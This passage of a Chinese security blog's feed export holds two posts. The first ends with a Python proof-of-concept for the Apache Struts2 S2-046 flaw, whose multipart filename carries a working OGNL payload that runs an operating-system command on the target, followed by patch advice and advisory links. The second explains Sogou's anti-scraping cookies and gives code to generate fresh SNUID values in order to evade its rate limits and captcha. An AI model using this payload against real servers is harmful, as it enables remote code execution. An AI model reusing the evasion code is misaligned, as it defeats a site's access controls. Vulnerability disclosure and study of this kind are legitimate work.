c.setopt(pycurl.CONNECTTIMEOUT, 300)</div><div class="line">    c.setopt(pycurl.TIMEOUT, 300)</div><div class="line">    c.setopt(pycurl.WRITEFUNCTION, sio.write)</div><div class="line">    try:</div><div class="line">        c.perform()</div><div class="line">    except Exception, ex:</div><div class="line">        pass</div><div class="line">    c.close()</div><div class="line">    resp = sio.getvalue()</div><div class="line">    sio.close()</div><div class="line">    <span class="built_in">return</span> resp</div><div class="line"></div><div class="line">data=<span class="string">"-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n"</span></div><div class="line"><span class="built_in">print</span> tt(<span class="string">'https://xxx.action'</span>,data)</div></pre></td></tr></table></figure>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
<li>严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。</li>
<li>如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）</li>
</ol>
<h3 id="官网公告"><a href="#官网公告" class="headerlink" title="官网公告"></a>官网公告</h3><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-045</a><br><a href="https://cwiki.apache.org/confluence/display/WW/S2-046" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-046</a></p>
<h3 id="补丁地址"><a href="#补丁地址" class="headerlink" title="补丁地址"></a>补丁地址</h3><p>Struts 2.3.32：<a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32</a><br>Struts 2.5.10.1：<a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1</a> </p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://struts.apache.org/docs/s2-045.html" target="_blank" rel="external">http://struts.apache.org/docs/s2-045.html</a><br><a href="http://struts.apache.org/docs/s2-046.html" target="_blank" rel="external">http://struts.apache.org/docs/s2-046.html</a><br><a href="https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723" target="_blank" rel="external">https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723</a></p>
<p>欲知Struts2-045请参考：<a href="http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/">struts2_045漏洞</a><br>欲知Struts2历史Poc请参数：<a href="http://thief.one/2017/03/13/Struts2%E6%BC%8F%E6%B4%9EPOC%E6%B1%87%E6%80%BB/">struts2漏洞poc汇总</a></p>
<p>转载请说明出处:<a href="http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/">Struts2_046漏洞</a><br>本文地址：<a href="http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/">http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/</a></p>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> struts2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[爬取搜索引擎之搜狗]]></title>
      <url>http://thief.one/2017/03/19/%E7%88%AC%E5%8F%96%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E6%90%9C%E7%8B%97/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">听过最落寞的一句话或诗句是什么？不如意事常八九，可与言者无二三</blockquote>

<p>　　上篇讲述了爬取百度搜索结果时遇到的问题以及解决方案，本篇继续爬取搜索引擎的话题，说说爬取搜狗时将会遇到什么问题？以及怎么去解决。搜狗搜索引擎的名气在国内远没有百度那么大，但却称得上是后起之秀，其搜索结果的准确度以及爬虫算法都还不错，可以说搜狗搜索在国内是继百度搜索之外的又一良好选择，想要了解百度搜索相关信息的，可以移步：<a href="http://thief.one/2017/03/17/%E7%88%AC%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E5%AF%BB%E4%BD%A0%E5%8D%83%E7%99%BE%E5%BA%A6/">爬取搜索引擎之寻你千百度</a><br><a id="more"></a><br>　　关于反爬虫的技术，网上有很多资源，方法不外乎（代理、识别验证码、分布式架构、模拟浏览器、ADSL切换ip等），这些不是本文的重点，本文只针对爬取搜狗搜索引擎时遇到的反爬虫措施，以及一些解决方案。</p>
<h3 id="为甚么要爬取搜狗"><a href="#为甚么要爬取搜狗" class="headerlink" title="为甚么要爬取搜狗"></a>为甚么要爬取搜狗</h3><ul>
<li>搜索结果比较准确比较全，没有类似百度保护资源的措施（搜索结果数比较准确）</li>
<li>同样拥有丰富的资源</li>
<li>反爬虫措施相对没有那么严格</li>
</ul>
<h3 id="搜狗反爬虫措施"><a href="#搜狗反爬虫措施" class="headerlink" title="搜狗反爬虫措施"></a>搜狗反爬虫措施</h3><p>　　利用爬虫爬取搜狗搜索引擎结果，首先要解决的是cookie的问题。搜狗会验证http请求是否带有cookie参数，如不带cookie那么请求次数将会非常有限。想要解决这一问题，我们必须先弄清楚搜狗搜索引擎cookie内容的组成，以及其作用。</p>
<h4 id="cookie内容解析"><a href="#cookie内容解析" class="headerlink" title="cookie内容解析"></a>cookie内容解析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Cookie: </div><div class="line">ABTEST=3|1489908642|v17; </div><div class="line">IPLOC=CN3301; </div><div class="line">SUID=899F006F2208990A0000000058CE33A3; </div><div class="line">SUV=1489908643339695; </div><div class="line">browerV=3; </div><div class="line">osV=1; </div><div class="line">sct=1; </div><div class="line">SNUID=1B0D93FD9297D882F63E3C8D93692285; </div><div class="line">ld=E@n5Llllll2Y80nclllllV0nGEklllllbZjKAyllll9lllll9Zlll5@@@@@@@@@@</div></pre></td></tr></table></figure>
<p>经过我测试，发现其中有几个参数异常重要，也是影响搜索反爬虫措施的关键参数，SUID、SNUID以及SUV。</p>
<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>　　SUID具体的含义可以自行百度，这里只讲述它生成的过程。当我们访问sogou搜索首页的时候，set-cookies中便会生成一个SUID参数的内容，除非重启浏览器，不然短时间内SUID并不会改变。SUID的值应该是sogou服务端随便分配的，只有当重新开启一个session时它的值才会更新。</p>
<h4 id="SNUID"><a href="#SNUID" class="headerlink" title="SNUID"></a>SNUID</h4><p>　　SNUID是sogou反爬虫的重点，sogou也是对同一个SNUID访问次数做了限制，而超过限制后，会跳转到验证码页面，只有输入验证码重新验证以后，SNUID才会更新，访问才能继续进行。那么SNUID是如何生成的呢？经过测试，应该是由javascript生成的，当然前提是要有SUID，SUID是生成SNUID的基础。</p>
<h4 id="SUV"><a href="#SUV" class="headerlink" title="SUV"></a>SUV</h4><p>SUV参数内容是由javascript生成的，测试并没有发现其对于反爬虫有何影响，故本文不做详细介绍。</p>
<h3 id="被屏蔽现象"><a href="#被屏蔽现象" class="headerlink" title="被屏蔽现象"></a>被屏蔽现象</h3><p>　　同样，要解决反爬虫问题，我们先来看看触发反爬虫的现象。当同一个SNUID访问次数受限后，继续访问sogou会跳转到一个验证码页面。<br>URL地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.sogou.com/antispider/?from=%2fweb%3Fquery%3d152512wqe%26ie%3dutf8%26_ast%3d1488957312%26_asf%3dnull%26w%3d01029901%26p%3d40040100%26dp%3d1%26cid%3d%26cid%3d%26sut%3d578%26sst0%3d1488957299160%26lkt%3d3%2C1488957298718%2C1488957298893</div></pre></td></tr></table></figure></p>
<p>页面源码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: nginx</div><div class="line">Date: Thu, 27 Oct 2016 04:41:19 GMT</div><div class="line">Content-Type: text/html</div><div class="line">Connection: keep-alive</div><div class="line">X-Powered-By: PHP/5.3.3</div><div class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</div><div class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</div><div class="line">Pragma: no-cache</div><div class="line">Content-Length: 5130</div><div class="line"></div><div class="line">&lt;!DOCTYPE HTML&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">    &lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"//www.sogou.com/images/logo2014/new/favicon.ico"</span> <span class="built_in">type</span>=<span class="string">"image/x-icon"</span>&gt;</div><div class="line">    &lt;title&gt;搜狗搜索&lt;/title&gt;</div><div class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"static/css/anti.min.css?v=1"</span>/&gt;</div><div class="line">    &lt;script src=<span class="string">"//dl.web.sogoucdn.com/common/lib/jquery/jquery-1.11.0.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">    &lt;script src=<span class="string">"static/js/antispider.min.js?v=2"</span>&gt;&lt;/script&gt;</div><div class="line">    &lt;script&gt;</div><div class="line">        var domain = getDomain();</div><div class="line">        window.imgCode = -1;</div><div class="line"></div><div class="line">        (<span class="function"><span class="title">function</span></span>() &#123;</div><div class="line">            <span class="keyword">function</span> <span class="function"><span class="title">checkSNUID</span></span>() &#123;</div><div class="line">                var cookieArr = document.cookie.split(<span class="string">'; '</span>),</div><div class="line">                    count = 0;</div><div class="line"></div><div class="line">                <span class="keyword">for</span>(var i = 0, len = cookieArr.length; i &lt; len; i++) &#123;</div><div class="line">                    <span class="keyword">if</span> (cookieArr[i].indexOf(<span class="string">'SNUID='</span>) &gt; -1) &#123;</div><div class="line">                        count++;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="built_in">return</span> count &gt; 1;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(checkSNUID()) &#123;</div><div class="line">                var date = new Date(), expires;</div><div class="line">                date.setTime(date.getTime() -100000);</div><div class="line"></div><div class="line">                expires = date.toGMTString();</div><div class="line"></div><div class="line">                document.cookie = <span class="string">'SNUID=1;path=/;expires='</span> + expires;</div><div class="line">                document.cookie = <span class="string">'SNUID=1;path=/;expires='</span> + expires + <span class="string">';domain=.www.sogou.com'</span>;</div><div class="line">                document.cookie = <span class="string">'SNUID=1;path=/;expires='</span> + expires + <span class="string">';domain=.weixin.sogou.com'</span>;</div><div class="line">                document.cookie = <span class="string">'SNUID=1;path=/;expires='</span> + expires + <span class="string">';domain=.sogou.com'</span>;</div><div class="line">                document.cookie = <span class="string">'SNUID=1;path=/;expires='</span> + expires + <span class="string">';domain=.snapshot.sogoucdn.com'</span>;</div><div class="line"></div><div class="line">                sendLog(<span class="string">'delSNUID'</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(getCookie(<span class="string">'seccodeRight'</span>) === <span class="string">'success'</span>) &#123;</div><div class="line">                sendLog(<span class="string">'verifyLoop'</span>);</div><div class="line"></div><div class="line">                <span class="built_in">set</span>Cookie(<span class="string">'seccodeRight'</span>, 1, getUTCString(-1), location.hostname, <span class="string">'/'</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(getCookie(<span class="string">'refresh'</span>)) &#123;</div><div class="line">                sendLog(<span class="string">'refresh'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;)();</div><div class="line"></div><div class="line">        <span class="keyword">function</span> <span class="built_in">set</span>ImgCode(code) &#123;</div><div class="line">            try &#123;</div><div class="line">                var t = new Date().getTime() - imgRequestTime.getTime();</div><div class="line">                sendLog(<span class="string">'imgCost'</span>,<span class="string">"cost="</span>+t);</div><div class="line">            &#125; catch (e) &#123;</div><div class="line">            &#125;</div><div class="line">            window.imgCode = code;</div><div class="line">        &#125;</div><div class="line">        sendLog(<span class="string">'index'</span>);</div><div class="line"></div><div class="line">        <span class="keyword">function</span> <span class="function"><span class="title">changeImg2</span></span>() &#123;</div><div class="line">            <span class="keyword">if</span>(window.event) &#123;</div><div class="line">                window.event.returnValue=<span class="literal">false</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class=<span class="string">"header"</span>&gt;</div><div class="line">    &lt;div class=<span class="string">"logo"</span>&gt;&lt;a href=<span class="string">"/"</span>&gt;&lt;img width=<span class="string">"180"</span> height=<span class="string">"60"</span> src=<span class="string">"//www.sogou.com/images/logo2014/error180x60.png"</span>&gt;&lt;/a&gt;&lt;/div&gt;</div><div class="line">    &lt;div class=<span class="string">"other"</span>&gt;&lt;span class=<span class="string">"s1"</span>&gt;您的访问出错了&lt;/span&gt;&lt;span class=<span class="string">"s2"</span>&gt;&lt;a href=<span class="string">"/"</span>&gt;返回首页&amp;gt;&amp;gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;div class=<span class="string">"content-box"</span>&gt;</div><div class="line">    &lt;p class=<span class="string">"ip-time-p"</span>&gt;IP:183.129.218.233&lt;br&gt;访问时间：2016.10.27 12:41:19&lt;/p&gt;</div><div class="line">    &lt;p class=<span class="string">"p2"</span>&gt;用户您好，您的访问过于频繁，为确认本次访问为正常用户行为，需要您协助验证。&lt;/p&gt;</div><div class="line">    &lt;p class=<span class="string">"p3"</span>&gt;&lt;label <span class="keyword">for</span>=<span class="string">"seccodeInput"</span>&gt;验证码：&lt;/label&gt;&lt;/p&gt;</div><div class="line">    &lt;form name=<span class="string">"authform"</span> method=<span class="string">"POST"</span> id=<span class="string">"seccodeForm"</span> action=<span class="string">"/"</span>&gt;</div><div class="line">        &lt;p class=<span class="string">"p4"</span>&gt;</div><div class="line">            &lt;input <span class="built_in">type</span>=text name=<span class="string">"c"</span> value=<span class="string">""</span> placeholder=<span class="string">"请输入验证码"</span> id=<span class="string">"seccodeInput"</span>&gt;</div><div class="line">            &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"tc"</span> id=<span class="string">"tc"</span> value=<span class="string">""</span>&gt;</div><div class="line">            &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"r"</span> id=<span class="string">"from"</span> value=<span class="string">"%2Fweb%3Fquery%3D%E6%9F%90%E8%8D%A3%26ie%3Dutf8%26_ast%3D1477536768%26_asf%3Dnull%26w%3D01029901%26cid%3D"</span> &gt;</div><div class="line">            &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"m"</span> value=<span class="string">"0"</span> &gt;            &lt;span class=<span class="string">"s1"</span>&gt;</div><div class="line">                &lt;script&gt;imgRequestTime=new Date();&lt;/script&gt;</div><div class="line">                &lt;a onclick=<span class="string">"changeImg2();"</span> href=<span class="string">"javascript:void(0)"</span>&gt;</div><div class="line">                    &lt;img id=<span class="string">"seccodeImage"</span> onload=<span class="string">"setImgCode(1)"</span> onerror=<span class="string">"setImgCode(0)"</span> src=<span class="string">"util/seccode.php?tc=1477543279"</span> width=<span class="string">"100"</span> height=<span class="string">"40"</span> alt=<span class="string">"请输入图中的验证码"</span> title=<span class="string">"请输入图中的验证码"</span>&gt;</div><div class="line">                &lt;/a&gt;</div><div class="line">            &lt;/span&gt;</div><div class="line">            &lt;a href=<span class="string">"javascript:void(0);"</span> id=<span class="string">"change-img"</span> onclick=<span class="string">"changeImg2();"</span> style=<span class="string">"padding-left:50px;"</span>&gt;换一张&lt;/a&gt;</div><div class="line">            &lt;span class=<span class="string">"s2"</span> id=<span class="string">"error-tips"</span> style=<span class="string">"display: none;"</span>&gt;&lt;/span&gt;</div><div class="line">        &lt;/p&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">    &lt;p class=<span class="string">"p5"</span>&gt;</div><div class="line">        &lt;a href=<span class="string">"javascript:void(0);"</span> id=<span class="string">"submit"</span>&gt;提交&lt;/a&gt;</div><div class="line">        &lt;span&gt;提交后没解决问题？欢迎&lt;a href=<span class="string">"http://fankui.help.sogou.com/index.php/web/web/index?type=10&amp;anti_time=1477543279&amp;domain=www.sogou.com"</span> target=<span class="string">"_blank"</span>&gt;反馈&lt;/a&gt;。&lt;/span&gt;</div><div class="line">    &lt;/p&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;div id=<span class="string">"ft"</span>&gt;&lt;a href=<span class="string">"http://fuwu.sogou.com/"</span> target=<span class="string">"_blank"</span>&gt;企业推广&lt;/a&gt;&lt;a href=<span class="string">"http://corp.sogou.com/"</span> target=<span class="string">"_blank"</span>&gt;关于搜狗&lt;/a&gt;&lt;a href=<span class="string">"/docs/terms.htm?v=1"</span> target=<span class="string">"_blank"</span>&gt;免责声明&lt;/a&gt;&lt;a href=<span class="string">"http://fankui.help.sogou.com/index.php/web/web/index?type=10&amp;anti_time=1477543279&amp;domain=www.sogou.com"</span> target=<span class="string">"_blank"</span>&gt;意见反馈&lt;/a&gt;&lt;br&gt;&amp;nbsp;&amp;copy;&amp;nbsp;2016&lt;span id=<span class="string">"footer-year"</span>&gt;&lt;/span&gt;&amp;nbsp;SOGOU&amp;nbsp;-&amp;nbsp;&lt;a href=<span class="string">"http://www.miibeian.gov.cn"</span> target=<span class="string">"_blank"</span> class=<span class="string">"g"</span>&gt;京ICP证050897号&lt;/a&gt;&amp;nbsp;-&amp;nbsp;京公网安备1100&lt;span class=<span class="string">"ba"</span>&gt;00000025号&lt;/span&gt;&lt;/div&gt;</div><div class="line">&lt;script src=<span class="string">"static/js/index.min.js?v=0.1.3"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;&lt;!--zly--&gt;</div></pre></td></tr></table></figure></p>
<h3 id="自动化生成SNUID"><a href="#自动化生成SNUID" class="headerlink" title="自动化生成SNUID"></a>自动化生成SNUID</h3><p>虽然知道了SNUID值生成的过程，但只有实现了自动化生成，才能正真绕过反爬虫的限制。</p>
<h4 id="通过访问验证码页面获取"><a href="#通过访问验证码页面获取" class="headerlink" title="通过访问验证码页面获取"></a>通过访问验证码页面获取</h4><p>当访问验证码页面，并填写验证码完成验证后，会重新生成一个新的SNUID，而此请求可以重复发送（不需要再次输入验证码），每次发送都会生成一个新的SNUID。</p>
<h4 id="通过模拟浏览器访问，执行javascript"><a href="#通过模拟浏览器访问，执行javascript" class="headerlink" title="通过模拟浏览器访问，执行javascript"></a>通过模拟浏览器访问，执行javascript</h4><p>可以利用phantomjs去爬取sogou页面，也能获取SNUID值。</p>
<h3 id="获取SNUID代码"><a href="#获取SNUID代码" class="headerlink" title="获取SNUID代码"></a>获取SNUID代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">获取SNUID的值</div><div class="line">'<span class="string">''</span></div><div class="line"></div><div class="line">import requests</div><div class="line">import json</div><div class="line">import time</div><div class="line">import random</div><div class="line"></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">方法（一）通过phantomjs访问sogou搜索结果页面，获取SNUID的值</div><div class="line">'<span class="string">''</span></div><div class="line">def phantomjs_getsnuid():</div><div class="line">    from selenium import webdriver</div><div class="line"></div><div class="line">    d=webdriver.PhantomJS(<span class="string">'D:\python27\Scripts\phantomjs.exe'</span>,service_args=[<span class="string">'--load-images=no'</span>,<span class="string">'--disk-cache=yes'</span>])</div><div class="line">    try:</div><div class="line">        d.get(<span class="string">"https://www.sogou.com/web?query="</span>)</div><div class="line">        Snuid=d.get_cookies()[5][<span class="string">"value"</span>]</div><div class="line">    except:</div><div class="line">        Snuid=<span class="string">""</span></div><div class="line">    d.quit()</div><div class="line"></div><div class="line">    <span class="built_in">return</span> Snuid</div><div class="line"></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">方法（二）通过访问特定url，获取body里面的id</div><div class="line">'<span class="string">''</span></div><div class="line">def Method_one():</div><div class="line">    url=<span class="string">"http://www.sogou.com/antispider/detect.php?sn=E9DA81B7290B940A0000000058BFAB0&amp;wdqz22=12&amp;4c3kbr=12&amp;ymqk4p=37&amp;qhw71j=42&amp;mfo5i5=7&amp;3rqpqk=14&amp;6p4tvk=27&amp;eiac26=29&amp;iozwml=44&amp;urfya2=38&amp;1bkeul=41&amp;jugazb=31&amp;qihm0q=8&amp;lplrbr=10&amp;wo65sp=11&amp;2pev4x=23&amp;4eyk88=16&amp;q27tij=27&amp;65l75p=40&amp;fb3gwq=27&amp;azt9t4=45&amp;yeyqjo=47&amp;kpyzva=31&amp;haeihs=7&amp;lw0u7o=33&amp;tu49bk=42&amp;f9c5r5=12&amp;gooklm=11&amp;_=1488956271683"</span></div><div class="line">    headers=&#123;<span class="string">"Cookie"</span>:</div><div class="line">    <span class="string">"ABTEST=0|1488956269|v17;\</span></div><div class="line">    IPLOC=CN3301;\</div><div class="line">    SUID=E9DA81B7290B940A0000000058BFAB6D;\</div><div class="line">    PHPSESSID=rfrcqafv5v74hbgpt98ah20vf3;\</div><div class="line">    SUIR=1488956269"</div><div class="line">    &#125;</div><div class="line">    try:</div><div class="line">        f=requests.get(url,headers=headers).content</div><div class="line">        f=json.loads(f)</div><div class="line">        Snuid=f[<span class="string">"id"</span>]</div><div class="line">    except:</div><div class="line">        Snuid=<span class="string">""</span></div><div class="line"></div><div class="line">    <span class="built_in">return</span> Snuid</div><div class="line"></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">方法（三）访问特定url，获取header里面的内容</div><div class="line">'<span class="string">''</span></div><div class="line">def Method_two():</div><div class="line">    url=<span class="string">"https://www.sogou.com/web?query=333&amp;_asf=www.sogou.com&amp;_ast=1488955851&amp;w=01019900&amp;p=40040100&amp;ie=utf8&amp;from=index-nologin"</span></div><div class="line">    headers=&#123;<span class="string">"Cookie"</span>:</div><div class="line">    <span class="string">"ABTEST=0|1488956269|v17;\</span></div><div class="line">    IPLOC=CN3301;\</div><div class="line">    SUID=E9DA81B7290B940A0000000058BFAB6D;\</div><div class="line">    PHPSESSID=rfrcqafv5v74hbgpt98ah20vf3;\</div><div class="line">    SUIR=1488956269"</div><div class="line">    &#125;</div><div class="line">    f=requests.head(url,headers=headers).headers</div><div class="line">    <span class="built_in">print</span> f</div><div class="line"></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">方法（四）通过访问需要输入验证码解封的页面，可以获取SNUID</div><div class="line">'<span class="string">''</span></div><div class="line">def Method_three():</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    http://www.sogou.com/antispider/util/seccode.php?tc=1488958062 验证码地址</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    http://www.sogou.com/antispider/?from=%2fweb%3Fquery%3d152512wqe%26ie%3dutf8%26_ast%3d1488957312%26_asf%3dnull%26w%3d01029901%26p%3d40040100%26dp%3d1%26cid%3d%26cid%3d%26sut%3d578%26sst0%3d1488957299160%26lkt%3d3%2C1488957298718%2C1488957298893</div><div class="line">    访问这个url，然后填写验证码，发送以后就是以下的包内容，可以获取SNUID。</div><div class="line">    '<span class="string">''</span></div><div class="line">    import socket</div><div class="line">    import re</div><div class="line">    res=r<span class="string">"id\"\: \"([^\"]*)\""</span></div><div class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">    s.connect((<span class="string">'www.sogou.com'</span>,80))</div><div class="line">    s.send(<span class="string">''</span><span class="string">'</span></div><div class="line">POST http://www.sogou.com/antispider/thank.php HTTP/1.1</div><div class="line">Host: www.sogou.com</div><div class="line">Content-Length: 223</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</div><div class="line">Cookie: CXID=65B8AE6BEE1CE37D4C63855D92AF339C; SUV=006B71D7B781DAE95800816584135075; IPLOC=CN3301; pgv_pvi=3190912000; GOTO=Af12315; ABTEST=8|1488945458|v17; PHPSESSID=f78qomvob1fq1robqkduu7v7p3; SUIR=D0E3BB8E393F794B2B1B02733A162729; SNUID=B182D8EF595C126A7D67E4E359B12C38; sct=2; sst0=958; 